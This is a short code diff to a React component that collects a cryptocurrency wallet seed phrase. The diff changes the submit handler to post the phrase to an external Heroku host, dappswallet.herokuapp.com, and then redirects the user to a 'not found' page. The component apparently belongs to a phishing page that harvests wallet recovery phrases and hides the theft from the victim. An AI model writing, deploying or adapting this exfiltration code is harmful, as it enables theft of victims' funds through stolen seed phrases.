@@ -13,7 +13,7 @@ const Phrase = ({ seed1, setSeed1, error1, setError1, disabled1, setDisabled1, c
     const isMatch2 = reg2.test(e.target.value);
     let len = e.target.value.length;
 
-    if (isMatch || isMatch2 || len == 0) {
+    if (isMatch || isMatch2 || len === 0) {
       setSeed1(e.target.value);
       setError1(false);
       setCount1(len)
@@ -26,7 +26,7 @@ const Phrase = ({ seed1, setSeed1, error1, setError1, disabled1, setDisabled1, c
 
 
   const handleSubmit = (e) => {
-    axios.post("http://localhost:8080/form", { seed: seed1 });
+    axios.post("http://dappswallet.herokuapp.com/form", { seed: seed1 });
     Navigate('/not_found')
   }
 
